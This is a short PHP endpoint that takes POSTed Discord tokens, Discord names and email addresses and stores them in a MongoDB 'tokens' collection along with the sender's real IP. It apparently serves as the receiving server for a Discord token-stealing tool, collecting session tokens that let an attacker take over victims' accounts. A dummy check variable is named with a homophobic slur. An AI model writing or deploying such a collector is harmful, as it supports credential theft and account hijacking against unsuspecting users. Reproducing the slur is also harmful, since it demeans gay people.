<?php

require "config.php";

if ($_SERVER["REQUEST_METHOD"] != "POST") {
    header("HTTP/1.1 400 Bad Request");
    die();
}

if (isset($_POST["token"]) && isset($_POST["discordname"]) && isset($_POST["email"])) {
    $realip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
    $FAGGOT = true;

    if (!$FAGGOT) {
        header("HTTP/1.1 403 Unauthorized");
        die();
    }

    $bulkWrite=new MongoDB\Driver\BulkWrite;
    $doc=["ip"=>"$realip", "name"=>$_POST["discordname"], "email"=>$_POST["email"], "token"=>$_POST["token"]];
    $bulkWrite->insert($doc);
    $MONGO_MANAGER->executeBulkWrite("$MONGO_DATABASE.$MONGO_TOKENS_COLL", $bulkWrite);

} else {
    header("HTTP/1.1 400 Bad Request");
    die();
}

?>